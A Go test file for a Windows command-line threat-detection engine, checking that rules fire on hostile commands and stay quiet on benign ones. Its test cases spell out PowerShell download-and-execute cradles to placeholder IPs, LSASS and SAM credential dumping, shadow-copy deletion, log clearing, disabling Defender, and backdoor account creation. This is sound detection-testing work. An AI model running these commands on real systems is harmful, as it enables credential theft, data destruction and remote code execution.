package collector

import (
	"encoding/base64"
	"strings"
	"testing"
	"unicode/utf16"
)

// psEncode builds a PowerShell -EncodedCommand argument (base64 of UTF-16LE).
func psEncode(script string) string {
	u := utf16.Encode([]rune(script))
	b := make([]byte, 2*len(u))
	for i, c := range u {
		b[2*i], b[2*i+1] = byte(c), byte(c>>8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func rulesOf(fs []Finding) map[string]Finding {
	m := map[string]Finding{}
	for _, f := range fs {
		m[f.Rule] = f
	}
	return m
}

func TestCommandLineRulesFire(t *testing.T) {
	cradle := psEncode("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')")
	benignEnc := psEncode("Get-Service | Where-Object Status -eq Running | Select-Object -First 5")
	cases := []struct {
		name, image, cmd, rule string
		sev                    Severity
	}{
		{"encoded cradle escalates", "powershell.exe", "powershell.exe -nop -w hidden -enc " + cradle, "exec.powershell_encoded", SevCritical},
		{"encoded cradle is download+execute", "powershell.exe", "powershell -e " + cradle, "exec.download_execute", SevCritical},
		{"encoded benign payload stays suspect", "powershell.exe", "powershell.exe -EncodedCommand " + benignEnc, "exec.powershell_encoded", SevSuspect},
		{"unicode dash", "powershell.exe", "powershell \u2013ec " + benignEnc, "exec.powershell_encoded", SevSuspect},
		{"slash form via cmd", "cmd.exe", `cmd.exe /c powershell /enc ` + benignEnc, "exec.powershell_encoded", SevSuspect},
		{"plain cradle", "powershell.exe", `powershell -c "iwr https://example.org/x.exe -OutFile $env:TEMP\x.exe"`, "exec.download_cradle", SevSuspect},
		{"irm pipe iex", "powershell.exe", `powershell -c "irm https://example.org/s | iex"`, "exec.download_execute", SevCritical},
		{"certutil urlcache", "certutil.exe", `certutil.exe -urlcache -split -f http://198.51.100.7/p.exe C:\Users\Public\p.exe`, "exec.download_cradle", SevSuspect},
		{"bitsadmin", "cmd.exe", `cmd /c bitsadmin /transfer j /download /priority high http://x.example/a.exe %TEMP%\a.exe`, "exec.download_cradle", SevSuspect},
		{"reflective load", "powershell.exe", `powershell -c "[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))"`, "exec.powershell_reflective_load", SevCritical},
		{"mshta url", "mshta.exe", `mshta.exe http://198.51.100.2/x.hta`, "exec.mshta_script", SevSuspect},
		{"mshta inline", "mshta.exe", `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")`, "exec.mshta_script", SevSuspect},
		{"rundll32 js", "rundll32.exe", `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)`, "exec.rundll32_script", SevCritical},
		{"squiblydoo", "regsvr32.exe", `regsvr32 /s /n /u /i:http://198.51.100.3/f.sct scrobj.dll`, "exec.regsvr32_scriptlet", SevCritical},
		{"certutil decode", "certutil.exe", `certutil -decode C:\Users\Public\a.txt C:\Users\Public\a.exe`, "exec.certutil_decode", SevSuspect},
		{"msiexec url", "msiexec.exe", `msiexec /q /i http://198.51.100.9/a.msi`, "exec.lolbin_proxy", SevSuspect},
		{"comsvcs minidump", "rundll32.exe", `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full`, "cred.lsass_dump", SevCritical},
		{"procdump lsass", "procdump64.exe", `procdump64.exe -accepteula -ma lsass.exe lsass.dmp`, "cred.lsass_dump", SevCritical},
		{"reg save sam", "reg.exe", `reg save HKLM\SAM C:\Windows\Temp\sam.save`, "cred.hive_or_ntds_dump", SevCritical},
		{"ntdsutil ifm", "ntdsutil.exe", `ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`, "cred.hive_or_ntds_dump", SevCritical},
		{"vssadmin delete", "vssadmin.exe", `vssadmin.exe delete shadows /all /quiet`, "impact.inhibit_recovery", SevCritical},
		{"wmic shadowcopy", "cmd.exe", `cmd.exe /c wmic shadowcopy delete`, "impact.inhibit_recovery", SevCritical},
		{"bcdedit", "bcdedit.exe", `bcdedit /set {default} recoveryenabled No`, "impact.inhibit_recovery", SevCritical},
		{"wbadmin", "wbadmin.exe", `wbadmin delete catalog -quiet`, "impact.inhibit_recovery", SevCritical},
		{"wevtutil cl", "wevtutil.exe", `wevtutil cl Security`, "defense.clear_event_logs", SevCritical},
		{"defender off", "powershell.exe", `powershell Set-MpPreference -DisableRealtimeMonitoring $true`, "defense.disable_defender", SevSuspect},
		{"defender exclusion", "powershell.exe", `powershell -c Add-MpPreference -ExclusionPath C:\ProgramData`, "defense.disable_defender", SevSuspect},
		{"firewall off", "netsh.exe", `netsh advfirewall set allprofiles state off`, "defense.firewall_disabled", SevSuspect},
		{"net user add", "net.exe", `net user backup P@ssw0rd! /add`, "persistence.account_created", SevSuspect},
		{"net user add, switch first", "net.exe", `net user /add backup P@ssw0rd!`, "persistence.account_created", SevSuspect},
		{"net localgroup add", "net.exe", `net localgroup administrators backup /add`, "persistence.admin_group_add", SevSuspect},
		{"wmic remote", "wmic.exe", `wmic /node:10.0.0.5 process call create "cmd /c whoami"`, "exec.wmic_process_create", SevSuspect},
		{"schtasks create", "schtasks.exe", `schtasks /create /tn upd /tr C:\x.exe /sc onlogon`, "exec.scheduled_task_create", SevNotable},
		{"sc create", "sc.exe", `sc create evil binPath= "C:\Users\Public\e.exe" start= auto`, "exec.service_create", SevNotable},
		{"hidden bypass", "powershell.exe", `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\x.ps1`, "exec.powershell_hidden", SevNotable},
		{"frombase64", "powershell.exe", `powershell -c "$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8='))"`, "exec.frombase64", SevNotable},
		{"undecodable payload still reported", "powershell.exe", "powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////////w", "exec.powershell_encoded", SevSuspect},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := rulesOf(analyzeCommandLine("process command line", c.image, c.cmd))
			f, ok := got[c.rule]
			if !ok {
				t.Fatalf("rule %s did not fire; got %v", c.rule, keys(got))
			}
			if f.Severity != c.sev {
				t.Fatalf("severity %s, want %s (%s)", f.Severity, c.sev, f.Detail)
			}
			if f.Technique == "" || f.Confidence <= 0 || !strings.HasPrefix(f.Detail, "process command line ") {
				t.Fatalf("incomplete finding %+v", f)
			}
		})
	}
}

func TestCommandLineRulesStayQuiet(t *testing.T) {
	benign := []struct{ image, cmd string }{
		{"svchost.exe", `C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule`},
		{"chrome.exe", `"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --enable-features=Foo https://example.org`},
		{"powershell.exe", `powershell.exe -File C:\Scripts\Backup.ps1`},
		{"powershell.exe", `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -File C:\x.ps1`},
		{"msiexec.exe", `C:\Windows\system32\msiexec.exe /i C:\Installers\app.msi /qn`},
		{"certutil.exe", `certutil -verify C:\certs\a.cer`},
		{"net.exe", `net user`},
		{"net.exe", `net localgroup administrators`},
		{"vssadmin.exe", `vssadmin list shadows`},
		{"bcdedit.exe", `bcdedit /set {current} recoveryenabled yes`},
		{"wevtutil.exe", `wevtutil qe Security /c:5`},
		{"cmd.exe", `cmd.exe /c echo hello`},
		{"rundll32.exe", `C:\Windows\system32\rundll32.exe C:\Windows\system32\shell32.dll,Control_RunDLL`},
		{"regsvr32.exe", `regsvr32 /s C:\Program Files\Acme\acme.dll`},
		{"dotnet.exe", `dotnet run --project .net user /addon`},
		{"powershell.exe", `powershell -e notbase64!!`},
		{"java.exe", `java -e 0123456789abcdefABCDEF0123456789`},
		{"sc.exe", `sc query windefend`},
		{"conhost.exe", `\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1`},
		{"", ``},
	}
	for _, b := range benign {
		if got := analyzeCommandLine("process command line", b.image, b.cmd); len(got) != 0 {
			t.Errorf("false positive on %q: %v", b.cmd, keys(rulesOf(got)))
		}
	}
}

func TestEncodedPayloadIsShownAndSuperseded(t *testing.T) {
	cmd := "powershell -nop -w hidden -enc " + psEncode("IEX (iwr 'https://example.org/p')")
	got := rulesOf(analyzeCommandLine("service", "", cmd))
	if _, ok := got["exec.powershell_hidden"]; ok {
		t.Fatal("hidden-window note should be superseded by the encoded-command finding")
	}
	if _, ok := got["exec.download_cradle"]; ok {
		t.Fatal("cradle should be superseded by download_execute")
	}
	enc := got["exec.powershell_encoded"]
	if !strings.Contains(enc.Detail, "decoded: IEX (iwr 'https://example.org/p')") {
		t.Fatalf("decoded payload not shown: %s", enc.Detail)
	}
}

func TestDecodePSPayloadRejectsNoise(t *testing.T) {
	if _, ok := decodePSPayload(base64.StdEncoding.EncodeToString([]byte{0x00, 0xff, 0x13, 0x88, 0x01, 0x02, 0x03})); ok {
		t.Fatal("binary noise decoded as a script")
	}
	if s, ok := decodePSPayload(psEncode("whoami")[:12]); ok && s == "" {
		t.Fatal("inconsistent")
	}
}

func TestExcerpt(t *testing.T) {
	if got := excerpt("a\t\tb\n\x00c"+strings.Repeat(" ", 50)+"d", 100); got != "a b c d" {
		t.Fatalf("got %q", got)
	}
	if got := excerpt(strings.Repeat("x", 10), 4); got != "xxxx…" {
		t.Fatalf("got %q", got)
	}
}

func TestEveryRuleHasMetadata(t *testing.T) {
	seen := map[string]bool{}
	for _, r := range cmdRules {
		if seen[r.id] || r.technique == "" || r.confidence <= 0 || r.confidence > 100 || sevRank(r.severity) == 0 {
			t.Errorf("rule %q: duplicate or incomplete metadata", r.id)
		}
		seen[r.id] = true
	}
}

func keys(m map[string]Finding) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}
